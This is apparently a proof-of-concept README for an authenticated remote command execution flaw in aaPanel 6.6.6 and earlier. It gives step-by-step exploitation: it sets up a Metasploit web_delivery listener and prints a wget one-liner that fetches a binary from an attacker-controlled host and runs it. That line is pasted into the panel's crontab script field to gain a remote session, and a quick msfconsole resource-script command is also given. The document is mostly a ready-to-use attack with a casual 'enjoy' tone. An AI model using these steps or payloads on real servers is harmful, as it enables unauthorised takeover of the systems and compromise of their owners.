# aapanel

## aapanel 6.6.6

* description : Allows attacker to execute command remotely
* Affected version : All <= 6.6.6

### Information

To make this POC, i just install fresh ubuntu, then i instaled wget + sudo and executed this script `wget -O install.sh http://www.aapanel.com/script/install-ubuntu_6.0_en.sh && sudo bash install.sh` 

* Vulnerability Type : Remote command execution (RCE Authenticated)


### POC

First of all, setup web_delivery options, this will create a payload and a listener.

<img width="1280" alt="web_delivery" src="https://raw.githubusercontent.com/jenaye/aapanel/master/web_delivery.png">


Now run it 

<img width="1280" alt="run" src="https://raw.githubusercontent.com/jenaye/aapanel/master/run.png">

this will generate the following payload  : 

 `wget -qO wt8v00sC --no-check-certificate http://xxxx:8088/gUVn1orp; chmod +x wt8v00sC; ./wt8v00sC& disown`


then  copy/past like this into `script content` of crontab menu in aapanel.


<img width="1280" alt="cron" src="https://raw.githubusercontent.com/jenaye/aapanel/master/cron.png">


Now just execute your crontab and wait your session.


<img width="1280" alt="command" src="https://raw.githubusercontent.com/jenaye/aapanel/master/command.png">


### Fast Exploit

just run `msfconsole -r aapanel-rce.rc`  copy/past the payload into  script content section, and enjoy u're sessions.